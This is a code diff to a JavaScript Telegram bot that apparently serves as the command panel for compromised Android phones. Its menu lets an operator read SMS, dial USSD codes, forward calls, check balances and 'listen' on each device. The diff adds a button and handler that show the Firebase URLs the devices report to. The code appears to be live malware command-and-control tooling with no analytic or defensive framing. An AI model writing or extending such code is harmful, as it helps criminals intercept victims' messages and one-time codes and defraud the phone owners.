@@ -1102,6 +1102,7 @@ async function showDeviceManagement(uid, chatId, messageId, deviceId, edit = tru
     [{ text: '📱 USSD', callback_data: `ussd_${deviceId}` }, { text: '📞 Call Dial', callback_data: `calldial_${deviceId}` }],
     [{ text: `📡 Call Fwd`, callback_data: `callfwd_${deviceId}` }],
     [{ text: `✅ Check Balance`, callback_data: `checkbalance_${deviceId}` }],
+    [{ text: `🔗 FB-URL`, callback_data: `fburl_${deviceId}` }],
     [{ text: `📡 Listening: ${user.listening && (user.listening_device === deviceId || !user.listening_device) ? '🟢 ON' : '⚫ OFF'}`, callback_data: `toggle_listen_${deviceId}` }],
     [{ text: `${(user.default_sim || 'sim1') === 'sim1' ? '●' : '○'} SIM1`, callback_data: `sim_${deviceId}_sim1` }, { text: `${(user.default_sim || 'sim1') === 'sim2' ? '●' : '○'} SIM2`, callback_data: `sim_${deviceId}_sim2` }],
     [{ text: '🔄 Refresh', callback_data: `refresh_${deviceId}` }, { text: '🔙 Back', callback_data: forAdmin ? 'admin_devices' : 'online_devices' }]
@@ -1955,6 +1956,24 @@ async function handleCallback(update) {
     if (data.startsWith('readsms_')) {
       const deviceId = data.substring(8);
       return showReadSMS(uid, chatId, msgId, deviceId, 0, true, false);
+    }
+    if (data.startsWith('fburl_')) {
+      const deviceId = data.substring(6);
+      const user = getUserData(uid);
+      const info = await getDeviceInfo(uid, deviceId).catch(() => null);
+      const devFb = info?.fbUrl || (state.global_devices[deviceId]?.fbUrl) || '';
+      const lines = ['🔗 **Connected Firebases**', '══════════════════════', ''];
+      if (devFb) lines.push(`📱 Device is on:\n\`${devFb}\`\n`);
+      const urls = (user.fb_urls || []);
+      if (urls.length === 0) lines.push('_No Firebase connected yet._');
+      for (const u of urls) {
+        lines.push(`${u === devFb ? '🔵' : '⏺️'} \`${u}\``);
+      }
+      lines.push('');
+      lines.push(`📌 Click \`${deviceId.substring(0, 8)}\` ke device ka URL upar hai. Use karo \`\`${devFb || 'https://...'}\`\`.`);
+      lines.push('Tap karke copy karo.');
+      await sendMessage(chatId, lines.join('\n'));
+      return;
     }
     if (data.startsWith('autotoken_')) {
       const deviceId = data.substring(10);
